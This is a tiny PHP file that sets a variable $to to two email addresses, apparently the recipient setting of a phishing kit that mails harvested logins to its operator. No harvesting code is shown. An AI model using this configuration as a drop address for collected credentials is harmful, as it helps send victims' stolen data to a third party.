<?php

$to = 'raccslogz02@gmail.com,raccslogz02@yahoo.com';

?>